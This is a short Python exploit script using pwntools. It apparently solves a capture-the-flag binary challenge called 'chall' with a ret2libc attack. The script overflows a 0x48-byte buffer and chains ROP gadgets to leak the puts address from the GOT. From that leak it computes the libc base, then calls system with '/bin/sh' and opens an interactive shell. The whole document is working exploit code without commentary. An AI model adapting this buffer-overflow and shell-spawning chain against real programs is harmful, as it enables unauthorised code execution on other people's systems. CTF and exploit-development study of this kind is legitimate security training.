from pwn import *

r = process("./chall")
libc = ELF("./libc.so.6")

ret = 0x401160
pop_rdi = 0x401161
puts_plt = 0x401030
puts_got = 0x403FD0
main = 0x401156

payload = b"A" * 0x48
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendafter(b"ROP> ", payload)
puts = u64(r.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc_base = puts - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload2 = b"A" * 0x48
payload2 += p64(ret)
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(system)

log.info("libc base: " + hex(libc_base))

r.sendafter(b"ROP> ", payload2)
r.interactive()
